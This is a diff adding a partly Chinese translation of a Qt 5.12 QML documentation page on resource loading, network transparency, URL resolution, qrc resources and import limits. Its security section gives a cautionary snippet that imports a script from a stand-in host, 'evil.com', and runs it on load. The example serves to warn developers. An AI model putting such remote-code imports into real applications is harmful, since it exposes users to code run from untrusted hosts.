@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<!-- networktransparency.qdoc -->
+  <title>Resource Loading and Network Transparency | Qt QML 5.12.3</title>
+  <link rel="stylesheet" type="text/css" href="style/offline-simple.css" />
+  <script type="text/javascript">
+    document.getElementsByTagName("link").item(0).setAttribute("href", "style/offline.css");
+    // loading style sheet breaks anchors that were jumped to before
+    // so force jumping to anchor again
+    setTimeout(function() {
+        var anchor = location.hash;
+        // need to jump to different anchor first (e.g. none)
+        location.hash = "#";
+        setTimeout(function() {
+            location.hash = anchor;
+        }, 0);
+    }, 0);
+  </script>
+</head>
+<body>
+<div class="header" id="qtdocheader">
+  <div class="main">
+    <div class="main-rounded">
+      <div class="navigationbar">
+        <table><tr>
+<td ><a href="../qtdoc/index.html">Qt 5.12</a></td><td ><a href="qtqml-index.html">Qt QML</a></td><td >Resource Loading and Network Transparency</td></tr></table><table class="buildversion"><tr>
+<td id="buildversion" width="100%" align="right"><a href="qtqml-index.html">Qt 5.12.3 Reference Documentation</a></td>
+        </tr></table>
+      </div>
+    </div>
+<div class="content">
+<div class="line">
+<div class="content mainContent">
+<div class="sidebar">
+<div class="toc">
+<h3><a name="toc">Contents</a></h3>
+<ul>
+<li class="level1"><a href="#relative-vs-absolute-urls">相对url和绝对url</a></li>
+<li class="level1"><a href="#qrc-resources">QRC资源</a></li>
+<li class="level1"><a href="#limitations">局限性</a></li>
+<li class="level1"><a href="#implications-for-application-security">对应用程序安全性的影响</a></li>
+</ul>
+</div>
+<div class="sidebar-content" id="sidebar-content"></div></div>
+<h1 class="title">资源加载和网络透明性</h1>
+<span class="subtitle"></span>
+<!-- $$$qtqml-documents-networktransparency.html-description -->
+<div class="descr"> <a name="details"></a>
+<p>QML通过对QML文档到其他内容的所有引用使用url(而不是文件名)来支持网络透明性。这意味着在任何需要URL源的地方，QML既可以处理本地资源，也可以处理远程资源，如下图所示:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;http://www.example.com/images/logo.png&quot;</span>
+  }
+
+</pre>
+<p>由于<i>relative</i>（相对）URL与相对文件相同，所以在常规文件系统上开发QML仍然很简单:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
+  }
+
+</pre>
+<p>整个QML都支持网络透明性，例如，<a href="../qtquick/qml-qtquick-fontloader.html">FontLoader</a> 和图像元素都支持从远程服务器加载资源。</p>
+<p>甚至QML类型本身可以在网络上——如果使用<a href="../qtdoc/qtquick-qmlscene.html">qmlscene的原型</a> 用于加载<code>http://example.com/mystuff/Hello.qml</code>，并且该内容引用类型&quot;World&quot;,引擎将加载<code>http://example.com/mystuff/qmldir</code> 并像解析本地文件一样解析类型。例如，如果qmldir文件包含一行&quot;World World.qml&quot;, ：它将加载<code>http://example.com/mystuff/World.qml</code>。 code>Hello.qml</code> 引用的任何其他资源(通常通过相对URL)也将类似地从网络加载。</p>
+<a name="relative-vs-absolute-urls"></a>
+<h2 id="relative-vs-absolute-urls">相对url和绝对url</h2>
+<p>每当对象具有URL类型(<a href="../qtcore/qurl.html">QUrl</a>)的属性时，为该属性分配一个字符串将实际分配一个绝对URL——通过根据使用该字符串的文档的URL解析该字符串。</p>
+<p>例如，请思考<code>http://example.com/mystuff/test.qml</code>中的内容:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
+  }
+
+</pre>
+<p><a href="../qtquick/qml-qtquick-image.html">Image</a> source属性将被分配到<code>http://example.com/mystuff/images/logo.png</code>，但是当QML被开发时，在<code>C:\User\Fred\Documents\MyStuff\test.qml</code>中，它将被分配到<code>C:\User\Fred\Documents\MyStuff\images\logo.png</code>。</p>
+<p>如果分配给URL的字符串已经是绝对URL，那么&quot;resolving&quot; 不会改变它，而是直接分配URL。</p>
+<a name="qrc-resources"></a>
+<h2 id="qrc-resources">QRC资源</h2>
+<p>Qt中内置的URL方案之一是&quot;qrc&quot;方案。这允许使用<a href="../qtcore/resources.html">Qt资源系统</a>将内容编译成可执行文件。使用这种方法，可执行文件可以引用编译成可执行文件的QML内容:</p>
+<pre class="cpp">
+
+  <span class="type"><a href="../qtquick/qquickview.html">QQuickView</a></span> <span class="operator">*</span>view <span class="operator">=</span> <span class="keyword">new</span> <span class="type"><a href="../qtquick/qquickview.html">QQuickView</a></span>;
+  view<span class="operator">-</span><span class="operator">&gt;</span>setUrl(<span class="type"><a href="../qtcore/qurl.html">QUrl</a></span>(<span class="string">&quot;qrc:/dial.qml&quot;</span>));
+
+</pre>
+<p>然后，内容本身可以使用相对url，因此透明地不知道内容已编译为可执行文件。</p>
+<a name="limitations"></a>
+<h2 id="limitations">局限性</h2>
+<p><code>import</code>语句只有在具有&quot;as&quot;子句时才具有网络透明性。</p>
+<p>更具体地说:</p>
+<ul>
+<li><code>导入&quot;dir&quot;</code>只适用于本地文件系统</li>
+<li><code>import libraryUri</code> only works on local file systems</li>
+<li><code>import &quot;dir&quot; as D</code> works network transparently</li>
+<li><code>import libraryUrl as U</code> works network transparently</li>
+</ul>
+<a name="implications-for-application-security"></a>
+<h2 id="implications-for-application-security">对应用程序安全性的影响</h2>
+<p>QML安全模型是QML内容是受信任的内容链:用户安装他们信任的QML内容的方式与安装原生Qt应用程序或用Python和Perl等运行时编写的程序相同。这种信任是由许多机制建立的，包括某些平台上的包签名可用性。</p>
+<p>为了维护用户的信任，QML应用程序开发人员不应该加载和执行任意的JavaScript或QML资源。例如，考虑下面的QML代码:</p>
+<pre class="qml">
+
+  import QtQuick 2.0
+  import &quot;http://evil.com/evil.js&quot; as Evil
+
+  <span class="type"><a href="qml-qtqml-component.html">Component</a></span> {
+      <span class="name">onLoaded</span>: <span class="name">Evil</span>.<span class="name">doEvil</span>()
+  }
+
+</pre>
+<p>这相当于下载并执行&quot;http://evil.com/evil.exe&quot;。<b>QML引擎不会阻止加载特定的资源。</b>与在web浏览器中运行的JavaScript代码不同，QML应用程序可以像加载任何其他本地应用程序一样加载远程或本地文件系统资源，因此应用程序开发人员在加载和执行任何内容时必须非常小心。</p>
+<p>与任何访问其无法控制的其他内容的应用程序一样，QML应用程序应该对其加载的任何不可信数据执行适当的检查。<b>例如，不要使用<code>import</code>、<a href="../qtquick/qml-qtquick-loader.html">Loader</a> 或 <a href="qtqml-javascript-qmlglobalobject.html#xmlhttprequest">XMLHttpRequest</a> 加载任何不可信的代码或内容。</b></p>
+</div>
+<!-- @@@qtqml-documents-networktransparency.html -->
+        </div>
+       </div>
+   </div>
+   </div>
+</div>
+<div class="footer">
+   <p>
+   <acronym title="Copyright">&copy;</acronym> 2019 The Qt Company Ltd.
+   Documentation contributions included herein are the copyrights of
+   their respective owners.<br/>    The documentation provided herein is licensed under the terms of the    <a href="http://www.gnu.org/licenses/fdl.html">GNU Free Documentation    License version 1.3</a> as published by the Free Software Foundation.<br/>    Qt and respective logos are trademarks of The Qt Company Ltd.     in Finland and/or other countries worldwide. All other trademarks are property
+   of their respective owners. </p>
+</div>
+</body>
+</html>
